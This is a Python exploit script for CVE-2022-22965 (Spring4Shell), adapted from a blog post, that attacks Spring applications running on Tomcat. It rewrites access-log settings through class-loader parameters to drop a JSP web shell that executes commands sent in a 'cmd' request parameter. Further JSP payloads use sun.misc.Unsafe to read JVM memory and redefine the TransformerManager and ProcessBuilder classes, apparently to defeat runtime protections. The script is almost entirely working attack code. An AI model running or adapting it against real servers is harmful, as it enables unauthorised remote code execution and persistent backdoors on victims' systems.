# adapted from https://aquasosal.tistory.com/24

from urllib.parse import urlparse
import requests
import argparse
import urllib3
import time

urllib3.disable_warnings()

BASE_ADDRESS_PROVIDER_BACKDOOR = """%{directive}i page import="java.lang.instrument.UnmodifiableClassException,java.lang.instrument.Instrumentation,java.lang.instrument.ClassDefinition,sun.misc.Unsafe,java.lang.reflect.Field,java.lang.reflect.Method,java.lang.*,java.util.*,java.io.*,java.nio.*" %{endtag}i %{starttag}i 
        Field theUnsafeField = Unsafe.class.getDeclaredField("theUnsafe");
        theUnsafeField.setAccessible(true);
        Unsafe unsafe = (Unsafe) theUnsafeField.get(null);  
        String mapsFilePath = "/proc/self/maps";
        String base = null;
        try (BufferedReader reader = new BufferedReader(new FileReader(mapsFilePath))) {
            String line;
            while ((line = reader.readLine()) != null) {
                if (line.contains("libjvm.so") && line.contains("r-xp")) {
                    base = line.split("-")[0].trim();
                }
            }
        } catch (IOException e) {
        }
        long libJvmSoBaseAddressLong = 0;
        if (base != null) {
            libJvmSoBaseAddressLong = Long.parseLong(base, 16);
        } else {
        }
        String offsetOfJvmtiEnvBase_head_environmentString = "0x0000000000f59750";
        long symbolOffset = Long.parseLong(offsetOfJvmtiEnvBase_head_environmentString.substring(2), 16);
        Long absoluteAddressHeadEnvironmentAddress = libJvmSoBaseAddressLong + symbolOffset;
        long jvmtiEnvAddress = unsafe.getLong(absoluteAddressHeadEnvironmentAddress);
        long envLocalStorateAddress = jvmtiEnvAddress + 4 * 8;
        long envLocalStorageValuePointed = unsafe.getLong(envLocalStorateAddress);
        long mAgentAddress = unsafe.getLong(envLocalStorageValuePointed + 8);
        long objectAddress = unsafe.getLong(mAgentAddress + 56);
        out.println(objectAddress);
         %{endtag}i         
         """

REDEFINE_TRANSFORMER_MANAGER = """%{directive}i page import="java.lang.instrument.UnmodifiableClassException,java.lang.instrument.Instrumentation,java.lang.instrument.ClassDefinition,sun.misc.Unsafe,java.lang.reflect.Field,java.lang.reflect.Method,java.lang.*,java.util.*,java.io.*,java.nio.*" %{endtag}i %{starttag}i 
    if(request.getParameter("%{parameter}i") != null){
        Field theUnsafeField = Unsafe.class.getDeclaredField("theUnsafe");
        theUnsafeField.setAccessible(true);
        Unsafe unsafe = (Unsafe) theUnsafeField.get(null);  
        long base = Long.parseLong(request.getParameter("%{parameter}i"));
        Instrumentation inst = (Instrumentation) getObject(unsafe, unsafe.getLong(base));
        redefineTransformerManager(inst);
        out.println("TransformerManager patched ! ^^");
        }        
         %{endtag}i     
     
      %{startfunctiontag}i 
          public static void redefineTransformerManager(Instrumentation instrumentation) throws ClassNotFoundException, UnmodifiableClassException {
                String hexClass = "";
                byte[] byteArray = hexStringToByteArray(hexClass);
                Class<?> clazz = Class.forName("sun.instrument.TransformerManager");
                ClassDefinition def = new ClassDefinition(clazz, byteArray);
                instrumentation.redefineClasses(def);
                System.out.println(clazz.getName() + " redefined");
            }
         %{endtag}i
         
           %{startfunctiontag}i 
            public static byte[] hexStringToByteArray(String s) {
        int len = s.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4)
                    + Character.digit(s.charAt(i+1), 16));
        }
        return data;}
             %{endtag}i
         
         %{startfunctiontag}i 
          public static Object getObject(Unsafe unsafe, long address) {
        Object[] objects = new Object[1];
        long arrayBaseOffset = unsafe.arrayBaseOffset(Object[].class);
        unsafe.putLong(objects, arrayBaseOffset, address);
        return objects[0];}
          %{endtag}i 
         """

REDEFINE_PROCESSBUILDER = """%{directive}i page import="java.lang.instrument.UnmodifiableClassException,java.lang.instrument.Instrumentation,java.lang.instrument.ClassDefinition,sun.misc.Unsafe,java.lang.reflect.Field,java.lang.reflect.Method,java.lang.*,java.util.*,java.io.*,java.nio.*" %{endtag}i %{starttag}i 
    if(request.getParameter("%{parameter}i") != null){
        Field theUnsafeField = Unsafe.class.getDeclaredField("theUnsafe");theUnsafeField.setAccessible(true);Unsafe unsafe = (Unsafe) theUnsafeField.get(null);  
        long base = Long.parseLong(request.getParameter("%{parameter}i")); Instrumentation inst = (Instrumentation) getObject(unsafe, unsafe.getLong(base));
        redefineProcessBuilder(inst);out.println("ProcessBuilder modified hehe ^^");}        
         %{endtag}i     
                  
           %{startfunctiontag}i 
        public static void redefineProcessBuilder(Instrumentation instrumentation) throws IOException, UnmodifiableClassException, ClassNotFoundException {
        byte[] classBytes = Objects.requireNonNull(ClassLoader.getSystemResourceAsStream("java/lang/ProcessBuilder.class")).readAllBytes();
        instrumentation.redefineClasses(new ClassDefinition(ProcessBuilder.class, classBytes));
    }
             %{endtag}i
         
         %{startfunctiontag}i 
          public static Object getObject(Unsafe unsafe, long address) {
        Object[] objects = new Object[1];
        long arrayBaseOffset = unsafe.arrayBaseOffset(Object[].class);
        unsafe.putLong(objects, arrayBaseOffset, address);
        return objects[0];}
          %{endtag}i 
         """

EXPLOIT = """%{directive}i page import="java.util.*,java.io.*" %{endtag}i %{starttag}i if(request.getParameter("%{parameter}i") != null){Process p = Runtime.getRuntime().exec(request.getParameter("%{parameter}i"));OutputStream os = p.getOutputStream();InputStream in = p.getInputStream();DataInputStream dis = new DataInputStream(in);String disr = dis.readLine();while ( disr != null ) {out.println(disr);disr = dis.readLine();}} %{endtag}i"""

classes = [
    'class.module.classLoader.resources.context.parent.pipeline.first.pattern',
    'class.module.classLoader.resources.context.parent.pipeline.first.suffix',
    'class.module.classLoader.resources.context.parent.pipeline.first.directory',
    'class.module.classLoader.resources.context.parent.pipeline.first.prefix',
    'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat',
]

Template_Variable = {
    'directive': '<%@',
    'endtag': '%>',
    'starttag': '<%',
    'startfunctiontag': '<%!',
    'parameter': 'cmd'
}


def argv():
    parser = argparse.ArgumentParser(description='CVE-2022-22965 RCE Exploit')

    parser.add_argument('--url', help='target url EX) --url=http://localhost:8080',
                        default="http://localhost:8080/exploit/greeting", dest="target", required=True)
    parser.add_argument('--file', help='WebShell file name to write to EX) --file=cmd', default="cmd", dest="filename")
    parser.add_argument('--dir', help='WebShell Directory Path to Write to. EX) --dir=webapps/ROOT',
                        default="webapps/ROOT")

    args = parser.parse_args()

    return args.filename, args.dir, args.target


def exploit():
    filename, directory, target = argv()

    if filename == "exploit":
        pattern = EXPLOIT
    elif filename == "base":
        pattern = BASE_ADDRESS_PROVIDER_BACKDOOR
    elif filename == "redefineTransformer":
        pattern = REDEFINE_TRANSFORMER_MANAGER
    elif filename == "redefineProcessBuilder":
        pattern = REDEFINE_PROCESSBUILDER
    else:
        raise Exception("filename does not match")

    payloads = {
        classes[0]: pattern,
        classes[1]: '.jsp',
        classes[2]: directory,
        classes[-2]: filename,
        classes[-1]: '',
    }

    res = requests.post(target, data={classes[-1]: '_'})
    print(f"\033[92m[+] INFO - {classes[0]} Resetting : _")

    res = requests.post(target, data=payloads)
    print(f"\033[92m[+] INFO - POST Response status code : {res.status_code}\033[0m")

    time.sleep(3)

    res = requests.get(target, headers=Template_Variable)

    print(f"\033[92m[+] INFO - GET Response status code : {res.status_code}\033[0m")

    time.sleep(1)

    res = requests.post(target, data={classes[0]: ''})

    print(f"\033[92m[+] INFO - Exploit Success\033[0m\n")

    parse_target = urlparse(target)
    shellurl = f"{parse_target.scheme}://{parse_target.netloc}/{filename}.jsp"

    print(f"\033[95m[*] INFO - WebShell URL : {shellurl}\033[0m")


if __name__ == '__main__':
    exploit()
